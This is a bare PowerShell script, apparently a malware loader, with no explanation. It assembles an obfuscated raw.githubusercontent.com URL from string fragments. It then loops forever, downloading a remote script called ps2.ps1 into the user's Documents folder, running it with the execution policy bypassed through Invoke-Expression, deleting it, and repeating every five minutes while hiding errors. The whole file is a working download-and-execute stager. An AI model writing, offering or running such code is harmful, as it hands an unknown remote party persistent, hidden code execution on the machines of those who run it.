$a1 = 'https://raw.github' + 'usercontent.com/'
$a2 = ('t0f','u')[0] + ('m4n')[0]
$a3 = ('/-0-v94837-09273w54-068245-0v9-62450-69u-b2-4059y-bn3-240w568-3450-862054986-2034p245iuyu6po7iu29345w/')[0..-1] -join ''
$a4 = ('main','/ps2','.ps1')[0,1,2] -join ''
$url = $a1 + $a2 + $a3 + $a4
$b1 = "$env:USERPROFILE"
$b2 = "\Documents\ps2.ps1"
$path = $b1 + $b2
while ($true) {
    try {
        $c = "Invoke-WebRequest -Uri $url -OutFile $path"
        Invoke-Expression $c
        $d = "powershell -ExecutionPolicy Bypass -File $path"
        Invoke-Expression $d
        $e = "Remove-Item -Path $path -Force"
        Invoke-Expression $e
    } catch {
        $f = "Error: $_"
    }
    Start-Sleep -Seconds 300
}
